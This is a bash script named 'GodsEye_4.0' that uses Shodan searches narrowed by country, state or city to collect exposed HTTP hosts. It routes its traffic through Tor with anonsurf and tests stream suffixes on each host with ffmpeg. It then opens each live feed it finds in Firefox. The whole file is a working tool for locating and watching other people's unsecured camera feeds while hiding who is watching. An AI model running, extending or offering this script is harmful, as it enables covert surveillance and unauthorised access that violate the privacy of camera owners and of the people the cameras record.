#!/bin/bash
# GodsEye_4.0

# Remove any pre-existing target sheet
rm -f targets.txt

# Load the locations from the CSV file into an array
IFS=$'\n' read -d '' -r -a locations < locations.csv

# Ask the user to select a view mode
echo "Select the view mode:"
echo "1. World View"
echo "2. Country View"
echo "3. State View"
echo "4. City View"
read -p "Enter your choice (1-4): " view_mode

case $view_mode in
  1)  # World View
    read -p "Execute World View? (yes/no): " execute_world
    if [[ $execute_world == "yes" ]]; then
        shodan search --limit 20 --fields ip_str,port --separator : 'http has_screenshot:1 -screenshot.label:blank 200 ok' | tee ips.txt
    else
        echo "World View canceled."
        exit 1
    fi
    ;;
  2)  # Country View
    read -p "Enter the country name: " country_name
    # Search for the country in the CSV file
    grep -i "^$country_name,," locations.csv | while IFS=',' read -r country state city abbreviation; do
        country_abbr=$(grep -i "^$country_name,," locations.csv | cut -d',' -f4)
        shodan search --limit 20 --fields ip_str,port --separator : 'http has_screenshot:1 -screenshot.label:blank 200 ok country:'$country_abbr'' | tee -a ips.txt
    done
    ;;
  3)  # State View
    read -p "Enter the country name: " country_name
    read -p "Enter the state name: " state_name
    # Search for the country and state in the CSV file
    grep -i "^$country_name,$state_name,," locations.csv | while IFS=',' read -r country state city abbreviation; do
        # Set country and state abbreviations
        country_abbr=$(grep -i "^$country_name,," locations.csv | cut -d',' -f4)
        state_abbr=$(grep -i "^$country_name,$state_name,," locations.csv | cut -d',' -f4)
        shodan search --limit 20 --fields ip_str,port --separator : 'http has_screenshot:1 -screenshot.label:blank 200 ok country:'$country_abbr' state:'$state_abbr'' | tee -a ips.txt
    done
    ;;
  4)  # City View
    read -p "Enter the country name: " country_name
    read -p "Enter the state name: " state_name
    read -p "Enter the city name: " city_name
    # Search for the country, state, and city in the CSV file
    grep -i "^$country_name,$state_name,$city_name" locations.csv | while IFS=',' read -r country state city abbreviation; do
        # Retrieve the country, state, and city abbreviations
        country_abbr=$(grep -i "^$country_name,," locations.csv | cut -d',' -f4)
        state_abbr=$(grep -i "^$country_name,$state_name,," locations.csv | cut -d',' -f4)
        city_abbr=$(grep -i "^$country_name,$state_name,$city_name" locations.csv | cut -d',' -f3)
        shodan search --limit 20 --fields ip_str,port --separator : 'http has_screenshot:1 -screenshot.label:blank 200 ok country:'$country_abbr' state:'$state_abbr' city:'$city_abbr'' | tee -a ips.txt
    done
    ;;
  *)
    echo "Invalid choice."
    exit 1
    ;;
esac

# Move acquired targets to the targets list
while IFS= read -r line; do
    echo "${line%?}" >> 1targets.txt
done < "ips.txt"

# remove blank lines on the list to prevent visualization errors
awk NF 1targets.txt > targets.txt

rm ips.txt
rm 1targets.txt

# Anonymizing all traffic and starting nyx to monitor traffic
qterminal -e sudo anonsurf start
qterminal -e sudo -u debian-tor nyx

# Match acquired target addresses with proper suffixes

# Paths to your files
TARGETS_FILE="targets.txt"
SUFFIXES_FILE="suffixes.txt"

# Create an array to store successful URLs
successful_urls=()

# Read the suffixes into an array
mapfile -t suffixes < "$SUFFIXES_FILE"

# Read all lines from targets.txt into an array
mapfile -t addresses < "$TARGETS_FILE"

# Function to check if a feed is valid using ffmpeg
check_feed() {
    address=$1
    port=$2
    for suffix in "${suffixes[@]}"; do
        url="http://${address}:${port}${suffix}"
        echo "Checking URL: $url"
        if ffmpeg -i "$url" -t 1 -vframes 1 -f null - &>/dev/null; then
            echo "Successfully connected to $url"
            successful_urls+=("$url")
            return 0
        else
            echo "Failed to connect to $url"
        fi
    done
    return 1
}

# Process each address from the array
for line in "${addresses[@]}"; do
    echo "Raw line: '$line'"

    line=$(echo "$line" | tr -d '\r' | xargs)
    
    address="${line%%:*}"
    port="${line##*:}"

    echo "Parsed address: '$address', Parsed port: '$port'"
    
    echo "Checking feed at ${address}:${port}..."
    check_feed "$address" "$port"
    echo "----------------------------------------"
done

# Open each successful URL in a new Firefox window
if [ ${#successful_urls[@]} -gt 0 ]; then
    echo "Opening each successful feed in its own Firefox window..."
    for url in "${successful_urls[@]}"; do
        firefox -width=450 -height=450 --new-window "$url" &
        sleep 3  # Allow some time for each window to open
    done
else
    echo "No successful connections found."
    exit 1
fi

# Exit script
exit 0
